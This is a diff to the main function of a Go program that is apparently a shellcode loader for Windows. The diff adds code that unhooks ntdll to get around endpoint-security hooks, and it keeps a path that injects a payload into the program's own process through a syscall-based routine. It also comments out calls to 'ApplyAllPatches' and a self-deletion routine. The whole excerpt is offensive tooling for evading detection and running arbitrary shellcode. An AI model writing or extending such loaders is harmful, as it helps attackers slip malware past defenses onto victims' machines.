@@ -313,6 +313,15 @@ func isProcessRunning(pid uint32) error {
 
 
 func main() {
+	// Enable debug mode by default for unhooking
+	debug.SetDebugMode(true)
+	debug.Printfln("MAIN", "Starting unhooking process...\n")
+
+	if err := winapi.UnhookNtdll(); err != nil {
+		debug.Printfln("MAIN", "Failed to unhook ntdll: %v\n", err)
+		os.Exit(1)
+	}
+	debug.Printfln("MAIN", "Successfully unhooked ntdll\n")
 
 	// Prewarm the syscall cache :3
 	if cacheErr := winapi.PrewarmSyscallCache(); cacheErr != nil {
@@ -710,14 +719,14 @@ func main() {
 		// Self-injection
 		debug.Printfln("MAIN", "Injecting payload into current process (self-injection)\n")
 		// apply all patches here because fuck it we fixed it
-		winapi.ApplyAllPatches()
+		// winapi.ApplyAllPatches()
 		err = winapi.NtInjectSelfShellcode(payload)
 		
 		if err != nil {
 			debug.Printfln("MAIN", "Self-injection failed: %v\n", err)
 		} else {
 			debug.Printfln("MAIN", "Self-injection Successful\n")
-			winapi.SelfDel()
+			// winapi.SelfDel()
 		}
 	}
 }
